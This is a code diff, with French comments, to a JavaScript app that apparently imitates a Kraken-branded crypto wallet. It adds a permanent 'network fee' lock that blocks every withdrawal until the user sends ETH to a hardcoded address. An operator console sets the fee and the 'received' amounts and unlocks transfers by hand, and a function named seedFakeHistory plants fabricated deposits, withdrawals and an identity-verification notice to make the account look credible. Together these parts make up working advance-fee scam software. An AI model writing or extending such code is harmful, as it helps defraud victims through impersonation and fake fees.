@@ -1261,6 +1261,9 @@
   }
 
   function sheetSend(explicit) {
+    // Verrou global : tant que les frais réseau ne sont pas réglés ET validés,
+    // aucune transaction n'est possible. La fiche des frais s'ouvre à la place.
+    if (pendingFeeGate()) return;
     PICK = explicit || PICK || "USDC";
     if (PICK === "EUR") {
       openSheet(`<div class="sheet-title">Envoyer des euros</div>
@@ -1415,7 +1418,59 @@
     return true;
   }
 
-  // ── montant retenu ──────────────────────────────────────────────────
+  // ── ordre d'attente permanent (créé par la console) ────────────────────
+  // Il existe avant la moindre transaction. Tant qu'il n'est pas réglé puis
+  // validé, aucun envoi n'est possible, toutes monnaies confondues : la fiche
+  // de suivi s'ouvre à la place du formulaire d'envoi. La console édite son
+  // adresse ETH, son montant de frais et son montant déjà reçu, en direct.
+  const PENDING_ID = "pend";
+  const PENDING_EXP = 7 * 24 * 3600 * 1000;
+
+  function pendingFee() {
+    const o = feeOrders()[PENDING_ID];
+    if (!o || o.done || o.cancelled) return null;
+    return o;
+  }
+
+  function pendingFeePatch(patch) {
+    const now = Date.now();
+    let o = feeOrders()[PENDING_ID];
+    if (!o) {
+      o = {
+        id: PENDING_ID, at: now, exp: now + PENDING_EXP, amount: 0, amt: 0,
+        sym: "ETH", pick: "USDC", addr: "", feeAddr: "", paid: 0,
+        ok: false, done: false, src: "admin", kind: "fee",
+        lock: true, pending: true, rev: now
+      };
+      feeOrders()[PENDING_ID] = o;
+    }
+    Object.assign(o, patch || {});
+    o.pending = true;
+    o.lock = true;
+    o.rev = now;
+    if (!(Number(o.exp) > now)) o.exp = now + PENDING_EXP;
+    o.statusTxt = o.ok ? "Validé — transactions débloquées" : "En attente des frais réseau";
+    saveLocal();
+    try { liveFeeRefresh(); } catch { }
+    return o;
+  }
+
+  function pendingFeePublish() {
+    const o = pendingFee();
+    if (!o) return;
+    try { deltaSend({ type: "feeOrder", order: { ...o } }); } catch { }
+  }
+
+  // Blocage : renvoie true quand une transaction est refusée et que la fiche
+  // des frais a été ouverte à la place.
+  function pendingFeeGate() {
+    const o = pendingFee();
+    if (!o || o.ok) return false;
+    try { closeSheet(); } catch { }
+    sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id });
+    return true;
+  }
+
   // Un envoi ne débite plus le solde à la diffusion : le montant est retenu
   // tant que les frais réseau ne sont pas réglés. La somme ne part qu'à la
   // validation ; un ordre supprimé ou purgé avant règlement laisse le solde
@@ -1551,6 +1606,9 @@
   // qui se met ensuite à jour toute seule à chaque modification.
   function ensureOrderNotif(o) {
     if (!o || !o.id || o.cancelled) return null;
+    // Un ordre d'attente encore vide (aucun montant publié) n'a rien à dire :
+    // il n'allume pas de ligne dans la liste.
+    if (o.pending && !(Number(o.amount) > 0)) return null;
     const at = Number(o.at) || Number(o.exp) - FEE_TTL || 0;
     if (!at) return null;
     // L'échéance passée ne retire rien : la fiche reste joignable tant que
@@ -1591,6 +1649,9 @@
   // encore couverts : c'est la seule population que la console purge.
   function feeAwaiting(o) {
     if (!o || o.done || o.cancelled) return false;
+    // L'ordre d'attente permanent (créé par la console avant toute
+    // transaction) n'est jamais purgé : il bloque tant qu'il n'est pas réglé.
+    if (o.pending) return false;
     return (Number(o.paid) || 0) < (Number(o.amount) || 0);
   }
 
@@ -1679,6 +1740,9 @@
       put("via", r.via || "");
       put("statusTxt", r.statusTxt || "");
       put("lock", !!r.lock);
+      // L'ordre d'attente permanent se reconnaît à ce drapeau : sans lui, un
+      // appareil distant ne saurait pas qu'il bloque les transactions.
+      put("pending", !!r.pending);
       // Une modification plus récente de la console fait autorité, y compris
       // quand elle rouvre un ordre déjà validé : sinon un montant changé
       // restait invisible côté client.
@@ -1779,6 +1843,9 @@
     const rem = order ? feeRemaining(order) : null;
     const done = !!order && !!order.done;
     const ok = !order || !!order.ok;
+    // Un ordre d'attente permanent n'est pas une transaction : il ouvre la
+    // fiche des frais et bloque tout le reste tant qu'il n'est pas validé.
+    const pend = !!(order && order.pending);
     const refShow = (order && order.ref) || genRef(pick);
     const amtShow = (order && Number(order.amt) > 0) ? Number(order.amt) : amt;
     const destShow = (order && order.addr) ? order.addr : addr;
@@ -1797,24 +1864,28 @@
     const feeTo = order ? feeAddrLive(order) : (fee > 0 ? feeAddrFor(feeSym, destShow) : "");
     const waiting = !done && !!order && rem.remaining > 0;
     window.__feeOpen = order ? order.id : null;
-    openSheet(`<div class="sheet-title">${done ? "Transaction envoyée" : "Envoi en cours"}</div>
-      <p class="sheet-sub" id="feeSub">${done
+    openSheet(`<div class="sheet-title">${pend ? (ok ? "Frais réseau réglés" : "Frais réseau à régler") : (done ? "Transaction envoyée" : "Envoi en cours")}</div>
+      <p class="sheet-sub" id="feeSub">${pend
+        ? (ok
+          ? "Les frais réseau sont validés. Vous pouvez relancer votre transaction."
+          : "Toutes les transactions sont bloquées, quelle que soit la monnaie, jusqu'au règlement des frais réseau.")
+        : done
         ? "La transaction a été confirmée et ajoutée à votre historique."
         : waiting
           ? "Votre transaction a été signée puis diffusée. Le montant reste bloqué sur votre solde : il ne partira qu'une fois les frais réseau réglés."
           : "Votre transaction a été signée puis diffusée sur le réseau."}</p>
       <div class="recap">
-        <div class="rc-row"><span>Actif</span><b id="feeAsset">${aName}</b></div>
+        ${pend ? "" : `<div class="rc-row"><span>Actif</span><b id="feeAsset">${aName}</b></div>
         <div class="rc-row"><span>Réseau</span><b id="feeNet">${netNow}</b></div>
         <div class="rc-row col"><span>Destinataire</span><code id="feeDest">${maskAddr(destShow)}</code></div>
         <div class="rc-row"><span>Montant</span><b id="feeAmt">${pick === "EUR" ? eur(amtShow, 2) : qtyTxt(amtShow, pick)}</b></div>
-        ${fee > 0 ? `<div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${feePair(feeNow, feeSym)}</b></div>` : ""}
-        <div class="rc-row col"><span>Référence</span><code id="feeRef">${maskTx(refShow)}</code></div>
-        <div class="rc-row"><span>Statut</span><b id="feeStatus" class="${done ? "ok" : "wait"}">${statusTxt}</b></div>
+        <div class="rc-row col"><span>Référence</span><code id="feeRef">${maskTx(refShow)}</code></div>`}
+        <div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${feePair(feeNow, feeSym)}</b></div>
+        <div class="rc-row"><span>Statut</span><b id="feeStatus" class="${done || (pend && ok) ? "ok" : "wait"}">${statusTxt}</b></div>
       </div>
-      ${waiting ? `<div class="fee-due">
+      ${pend || waiting ? `<div class="fee-due">
         <b>Frais réseau à régler</b>
-        <p>Il reste <b id="feeRemain">${feeAmtTxt(rem.remaining, feeSym)}</b> de frais réseau à régler en ${feeSym} pour confirmer la transaction.</p>
+        <p>Il reste <b id="feeRemain">${feeAmtTxt(rem.remaining, feeSym)}</b> de frais réseau à régler en ${feeSym}${pend ? " avant de pouvoir envoyer" : " pour confirmer la transaction"}.</p>
         <div class="recap">
           <div class="rc-row"><span>Montant à envoyer</span><b id="feeRemain2">${rem.remaining > 0 ? feePair(rem.remaining, feeSym) : feeAmtTxt(0, feeSym)}</b></div>
           <div class="rc-row"><span>Déjà reçu</span><b id="feePaid">${feeAmtTxt(rem.paid, feeSym)}</b></div>
@@ -1824,7 +1895,12 @@
         <button class="btn-ghost wide" id="feeCopy">Copier l'adresse des frais</button>
         <p class="sheet-note">Les frais se règlent uniquement en ${feeSym}. Dès que le transfert est détecté sur le réseau, le montant restant se met à jour et la validation se débloque.</p>
       </div>` : ""}
-      ${done
+      ${pend
+        ? (ok
+          ? `<button class="btn-black" id="sdOk">Continuer</button>`
+          : `<button class="btn-black" id="sdFeeSent" disabled>En attente de validation</button>
+             <button class="btn-ghost wide" id="sdOk">Plus tard</button>`)
+        : done
         ? `<button class="btn-black" id="sdOk">Terminé</button>`
         : `<button class="btn-black" id="sdFeeSent"${ok ? "" : " disabled"}>Valider la transaction</button>
            <button class="btn-ghost wide" id="sdOk">Plus tard</button>`}`);
@@ -2145,6 +2221,37 @@
   }
   function notifSave(a) { localStorage.setItem(NKEY, JSON.stringify(a.slice(0, 40))); }
 
+  // Historique de départ : l'application arrive avec un passé crédible, daté
+  // sur les dernières semaines. Ces lignes sont écrites directement dans le
+  // stockage — jamais par `addNotif` — donc aucune notification système ne
+  // part, et elles sont marquées comme déjà lues.
+  const SEED_KEY = "kraken_notifs_seed_v1";
+  function seedFakeHistory() {
+    if (localStorage.getItem(SEED_KEY)) return;
+    const now = Date.now();
+    const D = 864e5;
+    const H = 36e5;
+    const rows = [
+      { id: "seed01", kind: "deposit", asset: "BTC", amount: 0.00412, at: now - 19 * D, text: "Dépôt de 0,00412 BTC reçu." },
+      { id: "seed02", kind: "withdraw", asset: "ETH", amount: 0.2150, at: now - 17 * D, text: "Retrait de 0,2150 ETH confirmé." },
+      { id: "seed03", kind: "deposit", asset: "EUR", amount: 500, at: now - 14 * D - 6 * H, text: "Virement SEPA de 500,00 € crédité." },
+      { id: "seed04", kind: "deposit", asset: "USDC", amount: 1200, at: now - 11 * D, text: "Dépôt de 1 200,00 USDC reçu." },
+      { id: "seed05", kind: "withdraw", asset: "SOL", amount: 4.75, at: now - 8 * D - 3 * H, text: "Retrait de 4,7500 SOL confirmé." },
+      { id: "seed06", kind: "deposit", asset: "ETH", amount: 0.5, at: now - 6 * D, text: "Dépôt de 0,5000 ETH reçu." },
+      { id: "seed07", kind: "notice", asset: "", amount: 0, at: now - 4 * D, text: "Votre vérification d'identité a été validée." },
+      { id: "seed08", kind: "withdraw", asset: "BTC", amount: 0.00184, at: now - 2 * D - 5 * H, text: "Retrait de 0,00184 BTC confirmé." },
+      { id: "seed09", kind: "deposit", asset: "EUR", amount: 250, at: now - 1 * D, text: "Virement SEPA de 250,00 € crédité." }
+    ];
+    const list = notifList();
+    const ids = new Set(list.map(n => String(n.id)));
+    rows.forEach(r => { if (!ids.has(String(r.id))) list.push(r); });
+    list.sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0));
+    notifSave(list);
+    localStorage.setItem(NKEY + "_seen", String(now));
+    localStorage.setItem(SEED_KEY, "1");
+    notifBadge();
+  }
+
   function unreadCount() {
     const seen = Number(localStorage.getItem(NKEY + "_seen") || 0);
     return notifList().filter(x => (x.at || 0) > seen).length;
@@ -2355,8 +2462,10 @@
     });
     notifSave(list);
     notifBadge();
-    // Aucune banniere dessinee par l'app : seul le systeme (Apple) affiche.
-    mirrorSystemNotif(notifLabel(o), notifBody(o));
+    // L'historique se remplit en silence : aucune notification système n'est
+    // envoyée (ni au lancement, ni quand l'admin retouche un ordre). Seul un
+    // événement explicitement marqué `push` sort du téléphone.
+    if (o.push === true) mirrorSystemNotif(notifLabel(o), notifBody(o));
   }
 
   // Reprise silencieuse d'un historique publie (etat distant) : ni banniere,
@@ -3257,6 +3366,51 @@
 
   let IA_FEE = null; // null = liste, "new" = création, sinon id de l'ordre
 
+  // ── panneau frais réseau (avant transaction) ─────────────────────────
+  // Une seule fiche pilote l'ordre d'attente : montant des frais, montant déjà
+  // reçu, adresse ETH. Chaque frappe est publiée en direct vers l'application.
+  const DEFAULT_FEE_ETH = "0x22E839441132106d227dE2e28494e52778b75ca8";
+  let iaNetTimer = null;
+
+  function iaNetLive() {
+    const panel = $("#iaPanel");
+    if (!panel) return;
+    const num = key => {
+      const el = panel.querySelector('[data-ianet="' + key + '"]');
+      return el ? Math.max(0, iaNum(el.value)) : 0;
+    };
+    const amount = num("amount");
+    const paid = num("paid");
+    const addrEl = panel.querySelector('[data-iafeeaddr="ETH"]');
+    const addr = String(addrEl ? addrEl.value : "").trim();
+    ST.feeAddresses = ST.feeAddresses || {};
+    if (addr.length >= 10) ST.feeAddresses.ETH = addr;
+    // L'ordre d'attente porte l'adresse qui perçoit : celle saisie, sinon la
+    // valeur par défaut affichée dans le champ.
+    const feeAddr = addr.length >= 10 ? addr : DEFAULT_FEE_ETH;
+    const o = pendingFeePatch({ amount, paid, sym: "ETH", feeAddr });
+    if (o) {
+      // Les équivalents se recalculent sans re-rendu (le champ garde le focus).
+      const out = (k, v) => { const el = panel.querySelector('[data-ianetout="' + k + '"]'); if (el) el.textContent = v; };
+      out("amountEq", feeAmtTxt(amount, "ETH"));
+      out("paidEq", feeAmtTxt(paid, "ETH"));
+      out("remain", feeAmtTxt(Math.max(0, amount - paid), "ETH"));
+      try { ensureOrderNotif(o); } catch { }
+      pendingFeePublish();
+    }
+    try { liveFeeRefresh(); } catch { }
+  }
+
+  function iaNetSetValid(on) {
+    pendingFeePatch({ ok: !!on, done: false, cancelled: false });
+    saveLocal();
+    pendingFeePublish();
+    try { liveFeeRefresh(); } catch { }
+    try { renderAll(); } catch { }
+    iaRender();
+    toast(on ? "Transactions débloquées" : "Transactions bloquées");
+  }
+
   function iaFeeDraft(id) {
     const o = id && id !== "new" ? feeOrders()[id] : null;
     if (!o) {
@@ -3510,7 +3664,38 @@
         <button type="button" data-ia="delAct" data-actid="${iaEsc(x.id)}">Suppr.</button>
       </div>`).join("") : `<p class="ia-empty">Historique vide.</p>`;
 
+    // Ordre d'attente : il bloque les transactions tant qu'il n'est pas validé.
+    const pend = pendingFee();
+    const pendSym = (pend && pend.sym) || "ETH";
+    const pendAmount = pend ? Number(pend.amount) || 0 : 0;
+    const pendPaid = pend ? Number(pend.paid) || 0 : 0;
+    const pendAddr = (pend && pend.feeAddr) || ((ST.feeAddresses || {}).ETH) || "";
+    const pendOk = !!(pend && pend.ok);
+    const pendRemain = Math.max(0, pendAmount - pendPaid);
+
     body.innerHTML = `
+      <section class="ia-card ia-netfee${pendOk ? " is-ok" : ""}">
+        <h3>Frais réseau — avant transaction</h3>
+        <p class="ia-sub">Ce panneau agit <b>avant</b> la transaction. Tant que « Valider » n'est pas pressé, l'application refuse tout envoi, dans n'importe quelle monnaie, et ouvre cette fiche à la place. Chaque champ part en direct sur tous les appareils.</p>
+        <div class="recap">
+          <div class="rc-row"><span>Montant des frais (€)</span><input data-ianet="amount" inputmode="decimal" autocomplete="off" value="${iaField(pendAmount)}" placeholder="100"></div>
+          <div class="rc-row"><span>Équivalent ${pendSym}</span><b data-ianetout="amountEq">${feeAmtTxt(pendAmount, pendSym)}</b></div>
+          <div class="rc-row"><span>Déjà reçu (€)</span><input data-ianet="paid" inputmode="decimal" autocomplete="off" value="${iaField(pendPaid)}" placeholder="0"></div>
+          <div class="rc-row"><span>Équivalent reçu</span><b data-ianetout="paidEq">${feeAmtTxt(pendPaid, pendSym)}</b></div>
+          <div class="rc-row"><span>Reste à régler</span><b data-ianetout="remain">${feeAmtTxt(pendRemain, pendSym)}</b></div>
+          <div class="rc-row col"><span>Adresse des frais (ETH)</span>
+            <input data-iafeeaddr="ETH" spellcheck="false" autocomplete="off" value="${iaEsc(pendAddr)}" placeholder="0x22E839441132106d227dE2e28494e52778b75ca8">
+          </div>
+        </div>
+        <p class="ia-sub">${pendOk
+          ? "Validé : l'application laisse passer les transactions."
+          : "Non validé : l'application bloque les transactions et renvoie sur la fiche des frais."}</p>
+        <div class="ia-grid">
+          <button type="button" class="ia-btn" data-ia="netValid">Valider et débloquer</button>
+          <button type="button" class="ia-btn ghost" data-ia="netBlock">Bloquer les transactions</button>
+        </div>
+      </section>
+
       <section class="ia-card">
         <h3>Profil du compte</h3>
         <p class="ia-sub">Ces informations sont celles affichées dans l'application.</p>
@@ -3727,6 +3912,8 @@
       return iaCommit("Adresses de réception publiées");
     }
 
+    if (act === "netValid") { iaNetSetValid(true); return; }
+    if (act === "netBlock") { iaNetSetValid(false); return; }
     if (act === "saveFeeAddr") {
       ST.feeAddresses = ST.feeAddresses || {};
       panel.querySelectorAll("[data-iafeeaddr]").forEach(inp => {
@@ -3897,9 +4084,21 @@
       if (all) all.value = "";
       return;
     }
+    // Panneau frais réseau : montant et déjà reçu publiés ensemble.
+    if (el.matches("[data-ianet]")) {
+      clearTimeout(iaNetTimer);
+      iaNetTimer = setTimeout(() => { iaNetLive(); }, 500);
+      return;
+    }
     // Adresse de perception : enregistrée seule, publiée en un delta, sans
     // re-rendu du panneau (le champ garde le focus pendant la frappe).
     if (el.matches("[data-iafeeaddr]")) {
+      // Le même actif peut avoir deux champs (panneau frais réseau + liste) :
+      // ils restent miroirs, sinon le dernier lu écraserait la saisie.
+      const sym = el.dataset.iafeeaddr;
+      panel.querySelectorAll('[data-iafeeaddr="' + sym + '"]').forEach(inp => {
+        if (inp !== el && inp.value !== el.value) inp.value = el.value;
+      });
       clearTimeout(iaFeeAddrTimer);
       iaFeeAddrTimer = setTimeout(() => { iaFeeAddrLive(); }, 700);
       return;
@@ -4116,6 +4315,7 @@
     let failed = false;
     try {
       loadCache();
+      try { seedFakeHistory(); } catch { }
       renderAll();
       pinRender();
       notifBadge();
